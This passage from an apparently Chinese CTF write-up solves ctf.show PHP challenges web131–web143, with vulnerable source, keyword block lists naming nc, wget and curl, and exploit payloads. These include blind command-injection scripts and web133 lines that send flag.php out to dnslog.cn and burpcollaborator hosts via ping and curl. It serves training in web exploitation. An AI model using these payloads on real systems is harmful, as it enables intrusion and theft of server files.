function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则最大回溯即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e9ba2cd0-88f6-418c-891a-bba82431675b.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span> + <span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>访问<code>/robots.txt</code> 发现<code>/admin</code>，访问后得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php运算符优先级 <code>||</code>优先级低于<code>&amp;&amp;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure><h3 id="web133"><a href="#web133" class="headerlink" title="*web133"></a>*web133</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/109197158?spm=1001.2014.3001.5502">原理解析</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get传参   F=`$F `;sleep 3</span><br><span class="line">经过substr($F,0,6)截取后 得到  `$F `;</span><br><span class="line">也就是会执行 eval(&quot;`$F `;&quot;);</span><br><span class="line">我们把原来的$F带进去</span><br><span class="line">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class="line">也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 sleep 3</span><br><span class="line">所以 最后就是一道无回显的RCE题目了</span><br></pre></td></tr></table></figure><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>在<a href="http://dnslog.cn/">dnslog</a>获取地址<code>2553i2.dnslog.cn</code>，执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.2553i2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><p>然后刷新获得字符串，然后对前面的字符稍作处理即可（去除开头<code>flag</code>，加上括号，中间按照<code>uid</code>格式8-4-4-4-12添加<code>-</code>分割即可）</p><p><a href="https://img.gejiba.com/image/Ebjw1q"><img src="https://img.gejiba.com/images/18ef283bd3da16f381721534b8057a4f.png" alt="18ef283bd3da16f381721534b8057a4f.png"></a></p><h4 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h4><p>首先，打开<code>burpsuite</code>里的<code>Collaborator Client</code></p><p><a href="https://img.gejiba.com/image/EbjqQS"><img src="https://img.gejiba.com/images/1fd6303970f34fa5958ad60ab94d49ad.jpg" alt="1fd6303970f34fa5958ad60ab94d49ad.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F `;curl -X POST -F evo=@flag.php zdg64jrwcfs1whzlm8ytol9nkeq5eu.burpcollaborator.net</span><br></pre></td></tr></table></figure><p><a href="https://img.gejiba.com/image/EbjtkT"><img src="https://img.gejiba.com/images/165091d5e5f82d90b329ae7a3cea150e.png" alt="165091d5e5f82d90b329ae7a3cea150e.png"></a></p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以写文件，然后访问即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F`; cp flag.php 1.txt</span><br><span class="line">/?F=`$F`; nl f*&gt;aaa</span><br></pre></td></tr></table></figure><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用<code>tee</code>命令</p><blockquote><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件<br>用法:<br>tee file1 file2  &#x2F;&#x2F;复制文件<br>ls|tee 1.txt     &#x2F;&#x2F;命令输出到1.txt文件中</p></blockquote><p>查看目录后写文件即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ls /|tee aaa</span><br><span class="line">/?c=nl /f149_15_h3r3|tee bbb</span><br></pre></td></tr></table></figure><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/moliyiran/article/details/83514495">call_user_func()详解</a>调用静态方法即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>传数组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>awk逐行获取数据,cut命令逐列获取单个字符,利用if语句来判断命令是否执行,进行盲注</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> flag | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;&#123;&quot;</span> ];<span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> flag | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;&#123;&quot;</span> ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ `<span class="built_in">ls</span> / | awk NR==2 | <span class="built_in">cut</span> -c 5` == <span class="string">&quot;a&quot;</span> ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>编写<code>exp</code>，先是看文件名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://931d3429-d6c9-46bd-b83c-698b86f7aef1.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    f = <span class="number">0</span> <span class="comment"># 文件名长度</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            payload = <span class="string">f&#x27;if [ `ls / | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == &quot;<span class="subst">&#123;k&#125;</span>&quot; ];then sleep 3;fi&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                res += k</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> k == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">                f = <span class="number">1</span></span><br><span class="line">    res += <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment"># bin dev etc f149_15_h3r3</span></span><br></pre></td></tr></table></figure><p>然后是读取<code>f149_15_h3r3</code>文件内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = string.ascii_letters + string.digits + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://931d3429-d6c9-46bd-b83c-698b86f7aef1.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:</span><br><span class="line">        flag += <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">        payload = <span class="string">f&#x27;if [ `cat /f149_15_h3r3 | cut -c <span class="subst">&#123;i&#125;</span>` == &quot;<span class="subst">&#123;j&#125;</span>&quot; ];then sleep 3;fi&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctfshow&#123;64b4d686-aea8-4b70-bde3-6bb183c88169&#125;</span></span><br></pre></td></tr></table></figure><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">f1=md5&amp;f2=phpinfo</span><br><span class="line">f1=md5&amp;f2=md5</span><br><span class="line"></span><br><span class="line">还有很多</span><br><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/miuzzx/article/details/109197158?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167152613816782428677033%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167152613816782428677033&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-109197158-null-null.article_score_rank_blog&amp;utm_term=php%E7%89%B9%E6%80%A7&amp;spm=1018.2226.3001.4450</span><br></pre></td></tr></table></figure><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>php</code>中数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>是可以执行<code>phpinfo()</code>命令的。</p><p>故构造出<code>system(‘tac f*’) </code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=0</span><br></pre></td></tr></table></figure><h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span 